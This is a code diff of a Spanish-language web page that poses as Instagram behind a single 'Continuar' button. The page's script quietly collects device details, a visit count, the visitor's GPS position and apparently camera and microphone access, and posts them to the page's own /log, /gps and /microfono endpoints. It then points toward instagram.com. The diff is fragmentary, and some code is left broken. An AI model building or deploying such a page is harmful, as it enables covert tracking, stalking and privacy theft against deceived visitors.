@@ -1,66 +1,4 @@
-<!DOCTYPE html>
-<html lang="es">
 
-<head>
-
-<meta charset="UTF-8">
-
-<meta
-name="viewport"
-content="width=device-width,initial-scale=1.0">
-
-<title>Instagram</title>
-
-<style>
-
-body{
-
-   margin:0;
-   padding:0;
-
-   width:100%;
-   height:100vh;
-
-   background:black;
-
-   display:flex;
-
-   justify-content:center;
-
-   align-items:center;
-
-   overflow:hidden;
-
-   font-family:Arial;
-
-}
-
-#continuar{
-
-   width:80%;
-   max-width:400px;
-
-   height:60px;
-
-   border:none;
-
-   border-radius:15px;
-
-   font-size:22px;
-
-}
-
-</style>
-
-</head>
-
-<body>
-
-<button id="continuar">
-Continuar
-</button>
-
-<script>
 
 // =======================
 // DATOS AUTOMATICOS
@@ -82,12 +20,6 @@ const datos = {
 
    alto:
    screen.height,
-
-   colorDepth:
-   screen.colorDepth,
-
-   pixelRatio:
-   window.devicePixelRatio,
 
    memoria:
    navigator.deviceMemory,
@@ -119,16 +51,13 @@ const datos = {
    navigator.connection?.effectiveType,
 
    velocidad:
-   navigator.connection?.downlink,
-
-   ahorroDatos:
-   navigator.connection?.saveData,
+   navigator.connection?.downlink
 
 }
 
 
 // =======================
-// ENVIO AUTOMATICO
+// ENVIO DATOS
 // =======================
 
 fetch("/log",{
@@ -145,39 +74,7 @@ fetch("/log",{
 
 
 // =======================
-// CONTADOR VISITAS
-// =======================
-
-let visitas =
-localStorage.getItem("visitas")
-
-if(!visitas){
-
-   visitas = 0
-
-}
-
-visitas++
-
-localStorage.setItem("visitas", visitas)
-
-fetch("/log",{
-
-   method:"POST",
-
-   headers:{
-      "Content-Type":"application/json"
-   },
-
-   body:JSON.stringify({
-      visitas
-   })
-
-})
-
-
-// =======================
-// BOTON
+// BOTON CONTINUAR
 // =======================
 
 document
@@ -186,7 +83,7 @@ document
 
 
 // =======================
-// UBICACION
+// GPS
 // =======================
 
 navigator
@@ -218,15 +115,7 @@ async(pos)=>{
 
    })
 
-},
-
-(err)=>{
-
-   console.log(err)
-
-}
-
-)
+})
 
 
 // =======================
@@ -235,7 +124,6 @@ async(pos)=>{
 
 try{
 
-const stream =
 await navigator
 .mediaDevices
 .getUserMedia({
@@ -283,38 +171,3 @@ fetch("/microfono",{
 // "https://instagram.com"
 
 }
-document.getElementById("continuar")
-.onclick = ()=>{
-
-navigator.geolocation.getCurrentPosition((pos)=>{
-
-   fetch("/gps",{
-
-      method:"POST",
-
-      headers:{
-         "Content-Type":"application/json"
-      },
-
-      body: JSON.stringify({
-
-         lat: pos.coords.latitude,
-
-         lon: pos.coords.longitude
-
-      })
-
-   })
-
-})
-
-}
-
-
-</script>
-
-<script src="script.js"></script>
-
-</body>
-
-</html>
